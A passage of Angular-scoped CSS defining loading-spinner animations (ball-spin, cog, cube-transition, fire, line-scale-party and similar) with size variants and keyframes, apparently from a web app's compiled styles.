    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 50%;
      left: 95%;
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 81.8198051534%;
      left: 81.8198051534%;
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 94.9999999966%;
      left: 50.0000000005%;
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 81.8198046966%;
      left: 18.1801949248%;
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 49.9999750815%;
      left: 5.0000051215%;
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-ball-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 18.179464974%;
      left: 18.1803700518%;
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-ball-spin.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-spin.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-spin.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-spin.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px;
      margin-top: -8px;
      margin-left: -8px
    }

    .la-ball-spin.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-spin.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    @-webkit-keyframes ball-spin {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      20% {
        opacity: 1
      }

      80% {
        opacity: 0;
        transform: scale(0)
      }
    }

    @keyframes ball-spin {

      0%,
      to {
        opacity: 1;
        transform: scale(1)
      }

      20% {
        opacity: 1
      }

      80% {
        opacity: 0;
        transform: scale(0)
      }
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134],
    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-square-clockwise-spin.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134] {
      width: 26px;
      height: 26px
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 12px;
      height: 12px;
      margin-top: -6px;
      margin-left: -6px;
      border-radius: 100%;
      -webkit-animation: ball-square-clockwise-spin 1s ease-in-out infinite;
      animation: ball-square-clockwise-spin 1s ease-in-out infinite
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 0;
      left: 0;
      -webkit-animation-delay: -.875s;
      animation-delay: -.875s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 0;
      left: 50%;
      -webkit-animation-delay: -.75s;
      animation-delay: -.75s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 0;
      left: 100%;
      -webkit-animation-delay: -.625s;
      animation-delay: -.625s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 50%;
      left: 100%;
      -webkit-animation-delay: -.5s;
      animation-delay: -.5s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 100%;
      left: 100%;
      -webkit-animation-delay: -.375s;
      animation-delay: -.375s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 100%;
      left: 50%;
      -webkit-animation-delay: -.25s;
      animation-delay: -.25s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 100%;
      left: 0;
      -webkit-animation-delay: -.125s;
      animation-delay: -.125s
    }

    .la-ball-square-clockwise-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 50%;
      left: 0;
      -webkit-animation-delay: 0s;
      animation-delay: 0s
    }

    .la-ball-square-clockwise-spin.la-sm[_ngcontent-oeb-c134] {
      width: 12px;
      height: 12px
    }

    .la-ball-square-clockwise-spin.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px;
      margin-top: -3px;
      margin-left: -3px
    }

    .la-ball-square-clockwise-spin.la-2x[_ngcontent-oeb-c134] {
      width: 52px;
      height: 52px
    }

    .la-ball-square-clockwise-spin.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    .la-ball-square-clockwise-spin.la-3x[_ngcontent-oeb-c134] {
      width: 78px;
      height: 78px
    }

    .la-ball-square-clockwise-spin.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px;
      margin-top: -18px;
      margin-left: -18px
    }

    @-webkit-keyframes ball-square-clockwise-spin {

      0%,
      40%,
      to {
        transform: scale(.4)
      }

      70% {
        transform: scale(1)
      }
    }

    @keyframes ball-square-clockwise-spin {

      0%,
      40%,
      to {
        transform: scale(.4)
      }

      70% {
        transform: scale(1)
      }
    }

    .la-ball-square-spin[_ngcontent-oeb-c134],
    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-square-spin[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-square-spin.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-square-spin[_ngcontent-oeb-c134] {
      width: 26px;
      height: 26px
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 12px;
      height: 12px;
      margin-top: -6px;
      margin-left: -6px;
      border-radius: 100%;
      -webkit-animation: ball-square-spin 1s ease-in-out infinite;
      animation: ball-square-spin 1s ease-in-out infinite
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      top: 0;
      left: 0;
      -webkit-animation-delay: -1.125s;
      animation-delay: -1.125s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      top: 0;
      left: 50%;
      -webkit-animation-delay: -1.25s;
      animation-delay: -1.25s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      top: 0;
      left: 100%;
      -webkit-animation-delay: -1.375s;
      animation-delay: -1.375s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(4) {
      top: 50%;
      left: 100%;
      -webkit-animation-delay: -1.5s;
      animation-delay: -1.5s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(5) {
      top: 100%;
      left: 100%;
      -webkit-animation-delay: -1.625s;
      animation-delay: -1.625s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(6) {
      top: 100%;
      left: 50%;
      -webkit-animation-delay: -1.75s;
      animation-delay: -1.75s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(7) {
      top: 100%;
      left: 0;
      -webkit-animation-delay: -1.875s;
      animation-delay: -1.875s
    }

    .la-ball-square-spin[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(8) {
      top: 50%;
      left: 0;
      -webkit-animation-delay: -2s;
      animation-delay: -2s
    }

    .la-ball-square-spin.la-sm[_ngcontent-oeb-c134] {
      width: 12px;
      height: 12px
    }

    .la-ball-square-spin.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px;
      margin-top: -3px;
      margin-left: -3px
    }

    .la-ball-square-spin.la-2x[_ngcontent-oeb-c134] {
      width: 52px;
      height: 52px
    }

    .la-ball-square-spin.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px;
      margin-top: -12px;
      margin-left: -12px
    }

    .la-ball-square-spin.la-3x[_ngcontent-oeb-c134] {
      width: 78px;
      height: 78px
    }

    .la-ball-square-spin.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px;
      margin-top: -18px;
      margin-left: -18px
    }

    @-webkit-keyframes ball-square-spin {

      0%,
      40%,
      to {
        transform: scale(.4)
      }

      70% {
        transform: scale(1)
      }
    }

    @keyframes ball-square-spin {

      0%,
      40%,
      to {
        transform: scale(.4)
      }

      70% {
        transform: scale(1)
      }
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134],
    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-triangle-path.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: 0;
      width: 10px;
      height: 10px;
      border-radius: 100%
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation: ball-triangle-path-ball-one 2s ease-in-out 0s infinite;
      animation: ball-triangle-path-ball-one 2s ease-in-out 0s infinite
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation: ball-triangle-path-ball-two 2s ease-in-out 0s infinite;
      animation: ball-triangle-path-ball-two 2s ease-in-out 0s infinite
    }

    .la-ball-triangle-path[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation: ball-triangle-path-ball-tree 2s ease-in-out 0s infinite;
      animation: ball-triangle-path-ball-tree 2s ease-in-out 0s infinite
    }

    .la-ball-triangle-path.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-triangle-path.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px
    }

    .la-ball-triangle-path.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-triangle-path.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px
    }

    .la-ball-triangle-path.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-triangle-path.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px
    }

    @-webkit-keyframes ball-triangle-path-ball-one {
      0% {
        transform: translateY(220%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translate(110%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translate(220%, 220%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translateY(220%)
      }
    }

    @keyframes ball-triangle-path-ball-one {
      0% {
        transform: translateY(220%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translate(110%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translate(220%, 220%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translateY(220%)
      }
    }

    @-webkit-keyframes ball-triangle-path-ball-two {
      0% {
        transform: translate(110%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translate(220%, 220%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translateY(220%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translate(110%)
      }
    }

    @keyframes ball-triangle-path-ball-two {
      0% {
        transform: translate(110%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translate(220%, 220%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translateY(220%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translate(110%)
      }
    }

    @-webkit-keyframes ball-triangle-path-ball-tree {
      0% {
        transform: translate(220%, 220%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translateY(220%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translate(110%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translate(220%, 220%)
      }
    }

    @keyframes ball-triangle-path-ball-tree {
      0% {
        transform: translate(220%, 220%)
      }

      17% {
        opacity: .25
      }

      33% {
        opacity: 1;
        transform: translateY(220%)
      }

      50% {
        opacity: .25
      }

      66% {
        opacity: 1;
        transform: translate(110%)
      }

      83% {
        opacity: .25
      }

      to {
        opacity: 1;
        transform: translate(220%, 220%)
      }
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134],
    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-zig-zag-deflect.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134] {
      position: relative;
      width: 32px;
      height: 32px
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 10px;
      height: 10px;
      margin-top: -5px;
      margin-left: -5px;
      border-radius: 100%
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation: ball-zig-deflect 1.5s linear 0s infinite;
      animation: ball-zig-deflect 1.5s linear 0s infinite
    }

    .la-ball-zig-zag-deflect[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      -webkit-animation: ball-zag-deflect 1.5s linear 0s infinite;
      animation: ball-zag-deflect 1.5s linear 0s infinite
    }

    .la-ball-zig-zag-deflect.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-zig-zag-deflect.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-zig-zag-deflect.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-zig-zag-deflect.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin-top: -10px;
      margin-left: -10px
    }

    .la-ball-zig-zag-deflect.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-zig-zag-deflect.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin-top: -15px;
      margin-left: -15px
    }

    @-webkit-keyframes ball-zig-deflect {
      17% {
        transform: translate(-80%, -160%)
      }

      34% {
        transform: translate(80%, -160%)
      }

      50% {
        transform: translate(0)
      }

      67% {
        transform: translate(80%, -160%)
      }

      84% {
        transform: translate(-80%, -160%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes ball-zig-deflect {
      17% {
        transform: translate(-80%, -160%)
      }

      34% {
        transform: translate(80%, -160%)
      }

      50% {
        transform: translate(0)
      }

      67% {
        transform: translate(80%, -160%)
      }

      84% {
        transform: translate(-80%, -160%)
      }

      to {
        transform: translate(0)
      }
    }

    @-webkit-keyframes ball-zag-deflect {
      17% {
        transform: translate(80%, 160%)
      }

      34% {
        transform: translate(-80%, 160%)
      }

      50% {
        transform: translate(0)
      }

      67% {
        transform: translate(-80%, 160%)
      }

      84% {
        transform: translate(80%, 160%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes ball-zag-deflect {
      17% {
        transform: translate(80%, 160%)
      }

      34% {
        transform: translate(-80%, 160%)
      }

      50% {
        transform: translate(0)
      }

      67% {
        transform: translate(-80%, 160%)
      }

      84% {
        transform: translate(80%, 160%)
      }

      to {
        transform: translate(0)
      }
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134],
    .la-ball-zig-zag[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-ball-zig-zag.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134] {
      position: relative;
      width: 32px;
      height: 32px
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 10px;
      height: 10px;
      margin-top: -5px;
      margin-left: -5px;
      border-radius: 100%
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation: ball-zig-effect .7s linear 0s infinite;
      animation: ball-zig-effect .7s linear 0s infinite
    }

    .la-ball-zig-zag[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      -webkit-animation: ball-zag-effect .7s linear 0s infinite;
      animation: ball-zag-effect .7s linear 0s infinite
    }

    .la-ball-zig-zag.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-ball-zig-zag.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 4px;
      margin-top: -2px;
      margin-left: -2px
    }

    .la-ball-zig-zag.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-ball-zig-zag.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 20px;
      height: 20px;
      margin-top: -10px;
      margin-left: -10px
    }

    .la-ball-zig-zag.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-ball-zig-zag.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 30px;
      height: 30px;
      margin-top: -15px;
      margin-left: -15px
    }

    @-webkit-keyframes ball-zig-effect {
      0% {
        transform: translate(0)
      }

      33% {
        transform: translate(-75%, -150%)
      }

      66% {
        transform: translate(75%, -150%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes ball-zig-effect {
      0% {
        transform: translate(0)
      }

      33% {
        transform: translate(-75%, -150%)
      }

      66% {
        transform: translate(75%, -150%)
      }

      to {
        transform: translate(0)
      }
    }

    @-webkit-keyframes ball-zag-effect {
      0% {
        transform: translate(0)
      }

      33% {
        transform: translate(75%, 150%)
      }

      66% {
        transform: translate(-75%, 150%)
      }

      to {
        transform: translate(0)
      }
    }

    @keyframes ball-zag-effect {
      0% {
        transform: translate(0)
      }

      33% {
        transform: translate(75%, 150%)
      }

      66% {
        transform: translate(-75%, 150%)
      }

      to {
        transform: translate(0)
      }
    }

    .la-cog[_ngcontent-oeb-c134],
    .la-cog[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-cog[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-cog.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-cog[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-cog[_ngcontent-oeb-c134] {
      width: 31px;
      height: 31px
    }

    .la-cog[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 100%;
      height: 100%;
      background-color: transparent;
      border-style: dashed;
      border-width: 2px;
      border-radius: 100%;
      -webkit-animation: cog-rotate 4s linear infinite;
      animation: cog-rotate 4s linear infinite
    }

    .la-cog[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      content: "";
      border: 2px solid;
      border-radius: 100%
    }

    .la-cog.la-sm[_ngcontent-oeb-c134] {
      width: 15px;
      height: 15px
    }

    .la-cog.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134],
    .la-cog.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      border-width: 1px
    }

    .la-cog.la-2x[_ngcontent-oeb-c134] {
      width: 61px;
      height: 61px
    }

    .la-cog.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134],
    .la-cog.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      border-width: 4px
    }

    .la-cog.la-3x[_ngcontent-oeb-c134] {
      width: 91px;
      height: 91px
    }

    .la-cog.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134],
    .la-cog.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:after {
      border-width: 6px
    }

    @-webkit-keyframes cog-rotate {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    @keyframes cog-rotate {
      0% {
        transform: rotate(0deg)
      }

      to {
        transform: rotate(1turn)
      }
    }

    .la-cube-transition[_ngcontent-oeb-c134],
    .la-cube-transition[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-cube-transition[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-cube-transition.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-cube-transition[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-cube-transition[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-cube-transition[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      top: 0;
      left: 0;
      width: 14px;
      height: 14px;
      margin-top: -7px;
      margin-left: -7px;
      border-radius: 0;
      -webkit-animation: cube-transition 1.6s ease-in-out 0s infinite;
      animation: cube-transition 1.6s ease-in-out 0s infinite
    }

    .la-cube-transition[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:last-child {
      -webkit-animation-delay: -.8s;
      animation-delay: -.8s
    }

    .la-cube-transition.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-cube-transition.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px;
      margin-top: -3px;
      margin-left: -3px
    }

    .la-cube-transition.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-cube-transition.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 28px;
      height: 28px;
      margin-top: -14px;
      margin-left: -14px
    }

    .la-cube-transition.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-cube-transition.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 42px;
      height: 42px;
      margin-top: -21px;
      margin-left: -21px
    }

    @-webkit-keyframes cube-transition {
      25% {
        top: 0;
        left: 100%;
        transform: scale(.5) rotate(-90deg)
      }

      50% {
        top: 100%;
        left: 100%;
        transform: scale(1) rotate(-180deg)
      }

      75% {
        top: 100%;
        left: 0;
        transform: scale(.5) rotate(-270deg)
      }

      to {
        top: 0;
        left: 0;
        transform: scale(1) rotate(-1turn)
      }
    }

    @keyframes cube-transition {
      25% {
        top: 0;
        left: 100%;
        transform: scale(.5) rotate(-90deg)
      }

      50% {
        top: 100%;
        left: 100%;
        transform: scale(1) rotate(-180deg)
      }

      75% {
        top: 100%;
        left: 0;
        transform: scale(.5) rotate(-270deg)
      }

      to {
        top: 0;
        left: 0;
        transform: scale(1) rotate(-1turn)
      }
    }

    .la-fire[_ngcontent-oeb-c134],
    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-fire[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-fire.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-fire[_ngcontent-oeb-c134] {
      width: 32px;
      height: 32px
    }

    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: absolute;
      bottom: 0;
      left: 50%;
      width: 12px;
      height: 12px;
      border-radius: 0;
      border-radius: 2px;
      transform: translateY(0) translateX(-50%) rotate(45deg) scale(0);
      -webkit-animation: fire-diamonds 1.5s linear infinite;
      animation: fire-diamonds 1.5s linear infinite
    }

    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-delay: -.85s;
      animation-delay: -.85s
    }

    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(2) {
      -webkit-animation-delay: -1.85s;
      animation-delay: -1.85s
    }

    .la-fire[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:nth-child(3) {
      -webkit-animation-delay: -2.85s;
      animation-delay: -2.85s
    }

    .la-fire.la-sm[_ngcontent-oeb-c134] {
      width: 16px;
      height: 16px
    }

    .la-fire.la-sm[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 6px;
      height: 6px
    }

    .la-fire.la-2x[_ngcontent-oeb-c134] {
      width: 64px;
      height: 64px
    }

    .la-fire.la-2x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 24px;
      height: 24px
    }

    .la-fire.la-3x[_ngcontent-oeb-c134] {
      width: 96px;
      height: 96px
    }

    .la-fire.la-3x[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 36px;
      height: 36px
    }

    @-webkit-keyframes fire-diamonds {
      0% {
        transform: translateY(75%) translateX(-50%) rotate(45deg) scale(0)
      }

      50% {
        transform: translateY(-87.5%) translateX(-50%) rotate(45deg) scale(1)
      }

      to {
        transform: translateY(-212.5%) translateX(-50%) rotate(45deg) scale(0)
      }
    }

    @keyframes fire-diamonds {
      0% {
        transform: translateY(75%) translateX(-50%) rotate(45deg) scale(0)
      }

      50% {
        transform: translateY(-87.5%) translateX(-50%) rotate(45deg) scale(1)
      }

      to {
        transform: translateY(-212.5%) translateX(-50%) rotate(45deg) scale(0)
      }
    }

    .la-line-scale-party[_ngcontent-oeb-c134],
    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      position: relative;
      box-sizing: border-box
    }

    .la-line-scale-party[_ngcontent-oeb-c134] {
      display: block;
      font-size: 0;
      color: #fff
    }

    .la-line-scale-party.la-dark[_ngcontent-oeb-c134] {
      color: #333
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      display: inline-block;
      float: none;
      background-color: currentColor;
      border: 0 solid
    }

    .la-line-scale-party[_ngcontent-oeb-c134] {
      width: 40px;
      height: 32px
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134] {
      width: 4px;
      height: 32px;
      margin: 0 2px;
      border-radius: 0;
      -webkit-animation-name: line-scale-party;
      animation-name: line-scale-party;
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite
    }

    .la-line-scale-party[_ngcontent-oeb-c134]>div[_ngcontent-oeb-c134]:first-child {
      -webkit-animation-duration: .43s;
      animation-duration: .43s;
      -webkit-animation-delay: -.23s;
